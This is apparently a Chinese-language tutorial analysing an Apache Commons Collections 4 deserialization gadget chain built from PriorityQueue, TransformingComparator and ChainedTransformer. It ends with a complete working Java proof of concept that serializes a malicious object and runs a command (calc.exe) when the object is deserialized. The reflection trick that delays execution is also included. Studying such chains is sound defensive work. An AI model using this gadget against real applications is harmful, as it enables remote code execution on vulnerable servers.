一：ChainedTransformer–InvokerTransformer利用链分析

一：入口处PriorityQueue类

该类实现了序列化接口，满足利用条件，重写了readObject方法，是反序列化链的入口处，传入了一个ObjectinputStream类的实例化s，后续再方法中利用对象输入流的实例s进行了多次调用，s是序列化后的字节数据，先执行默认反序列化逻辑，恢复s的非transient 成员变量，比如size，s.readInt读取反序列化后的int类型数据，后续初始化一个队列，大小就是前面读取序列化字节流恢复的size，然后循环对s进行反序列化读取字节流，回复对象，因为PriorityQueue的底层是数组，序列化时需要逐次写入流，反序列化读取时也需要逐次读取流进行恢复，并且依次填入队列中

s.readObject的作用：在利用ObjectOutputStream.writeObject()进行序列化时，会将int类型的属性转换为字节流，ObjectnputStream.readInt()的作用是反序列化时的将字节流还原成int类型的值，并且赋值给成员

假设一个类：

class User implements Serializable {
private int age; // int类型字段
// 自定义readObject
private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
// 用s.readInt()读取序列化时写入的age值，恢复到当前对象的age字段
this.age = s.readInt();
}
}

readInt的作用就是还原字节数据为int类型的值，再赋值给对象的对应字段

二：中间件追踪

在重写的readObject方法中有一个方法heapify(),进入后发现它调用了siftDown方法

跟进siftDown方法，if语句里面对comparator这个接口类进行了判断是否为空，跟进这个接口类

该接口接受两个对象参数，并进行比较，返回int，比较o1和o2优先级，如果返回负数，则o2优先级更高，若返回正数则0

1更高

在jdk的库中没有对这个方法写入方法体，只做了声明作用，在cc库的transformingComparator库中对这个方法进行了重写，也是利用链的关键

对compare重写，传入两个对象，两个对象都调用了transformer接口的transform方法，transform方法是命令执行的关键，根据cc1链，命令执行最后的触发是chaintransformer，链式转换接口，所以这里将transformer成员赋值为ChainTransformer链式接口就可以达到ChainTransformer.transform()，执行命令，目前链的结构出来了，后续慢慢分块进行验证

三：分块验证

一：

ChainTransformer链式转换部分

TransformingComparator类的构造器，可以直接对transformer进行赋值为ChainTransformer

前面分析到jvm调用readObject方法时会去调用Comparator接口类的compare方法进行优先级比较，cc库的TransformingComparator接口中的compare方法进行了重写，并且执行了transform，如果实例化一个TransformingComparator接口类并将其赋值给这个队列类的Comparator成员就可以实现对TransformingComparator中的compare方法的调用，达到目的，接下来考虑如何对这个成员变量进行赋值

找到PriorityQueue类的构造器，这里comparator参数是可以进行赋值的，TransformingComparator类实现了comparator接口，本质也是一个comparator接口类，类型相同可以进行赋值

二：

赋值完成，分析readObject方法是怎样往下一直执行到compare方法的

跟进：heapify->siftDown->siftDownUsingComparator->comparator.compare

如果要触发compare就必须执行到这，通过跟进可以发现是存在很多if语句的，也就是说要满足这些if语句才行，依次满足条件

siftDown：

size >>> 1等价于整数除2，5 >>> 1=2，6 >>> 1=3，所以要进入循环size的大小必须大于等于2，当等于2时结构减一刚好可以进入依次循环，这里不用考虑循环次数，进入siftDown方法就行，在之前的构造器中可以发现并不能对size这个成员变量进行赋值，所以构造走不通

size的大小刚开始为0，全局搜索size看有没有方法对size进行操作

在add方法的offer方法里面对size进行了加一操作，我们可以通过这个方法去改变size的值，分析这个方法，size参数记录队列中的元素个数，offer方法的作用是利用其添加队列元素，当往队列中成功添加元素后size会加1，在上面第一步进行queue对象实例化时并没有传入一个队列数据，所以s.readInt方法获取到的size大小是0，利用offer方法往队列中插入两个元素，size就可以变成进入循环条件的最小整数，完善代码

在增加元素offer操作处打上断点，看size值有没有变化

执行依次offer操作后成功加1，目前进入了if语句，跟进siftDown方法

要进入compare方法需要进入siftDownUsingComparator方法，if条件是comparator接口类不为空，开始实例化testqueue类的时候已经赋值了，所以这里直接就能进入，跟进siftDownUsingComparator方法

这里只需要进入while循环，后续都能进入if语句执行compare方法

这里条件判断是k<size/2,分析参数k来自哪里，往前追踪发现k参数就是第一次ifyuju里面的i，也就是size/2-1，当size=2时，传入的k大小为0，half大小为1，条件满足，能进入，后续不管进入哪一条if语句目的都能达到，不需要处理

运行，并没有反序列化为什么会触发readObject方法，并且当我关闭一个计算机时发现还有一个计算机，分析

经过分析，弹出两次计算机的原因是因为在TransformComparator中comapre方法分别对o1和o2执行了两次testchain.transform

但是为什么没有反序列化加载readObjecct方法就能触发命令执行

回到offer方法，前面只想着让size等于2，忽略了当i不等于0时这个方法会调用siftup方法，当调用了依次offer方法后i就不等于0，就回去执行这个方法，跟进

进入if语句里面，执行siftUpUsingComparator,跟进

是这个方法执行了comparator.compare方法，这样也能弹，为了利用readObject来弹可以在offer方法前后用两条转换链，offer操作前使用无意义的链，这样既能利用offer修改size大小，又能防止构造的链被先执行，offer操作后再反射修改转换链

最终poc：

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class Test {
public static void main(String[] args) throws Exception{
//无意义的链，目的是为了修改size并防止恶意链被siftup方法提前触发
ConstantTransformer nouse1=new ConstantTransformer(1);//输入1对常量赋值为int对象
ConstantTransformer nouse2=new ConstantTransformer(2);
Transformer[] nousenousetranfromers=new Transformer[]{nouse1,nouse2};
ChainedTransformer chain=new ChainedTransformer(nousenousetranfromers);

    ConstantTransformer runtimeclass=new ConstantTransformer(Runtime.class);
    //链式转换的起点，后续是反射调用方法
    InvokerTransformer runtimemethod=new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]});
    InvokerTransformer runtimeinvoke=new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{"Runtime.class",new Object[0]});
    InvokerTransformer exectest=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc.exe"});
    Transformer[] transformers=new Transformer[]{runtimeclass,runtimemethod,runtimeinvoke,exectest};
    //ChainedTransformer testchain=new ChainedTransformer(transformers);
    //testchain本身也是一个Tansformer接口类，所以和TransformingComparator类的成员属性transformer一样，可以进行赋值

    TransformingComparator testcomparator=new TransformingComparator(chain);
    //将testchain链式转换对象赋值给TransformingComparator类的transformer成员，后续compare方法调用直接就对testcahin进行调用，触发命令执行,这个类也是一个comparator接口
    PriorityQueue testqueue=new PriorityQueue(testcomparator);
    testqueue.offer(1);
    testqueue.offer(1);

    Field field=ChainedTransformer.class.getDeclaredField("iTransformers");
    field.setAccessible(true);
    field.set(chain,transformers);

    serialize(testqueue);
    unserialize("ser.bin");
}

    public static void serialize(Object object) throws Exception{
        ObjectOutputStream objectoutputstream=new ObjectOutputStream(new FileOutputStream("ser.bin"));
        objectoutputstream.writeObject(object);
    }

    public static void unserialize(String filename) throws Exception{
        ObjectInputStream objectinputstream=new ObjectInputStream(new FileInputStream(filename));
        objectinputstream.readObject();
    }

}

运行：

利用成功

总结：

利用链：objectInputStream.readObject -> PriorityQueue.readObject -> heapify() -> siftDown() -> if (comparator != null); siftDownUsingComparator(k, x); -> comparator.compare -> TransformingComparator.compare()

ChainedTransformer.iTransformers利用构造器赋值为恶意链chain，再将chain赋值为TransformingComparator.compare()方法中的transformer，使ChainedTransformer.transform发生触发命令执行

无意义的链先绕过offer方法里的siftup操作，防止恶意链被提前执行，进行完offer操作后修改了size的大小触发后续逻辑，再将chain对象中的iTransformers数组字段利用反射机制修改为恶意链
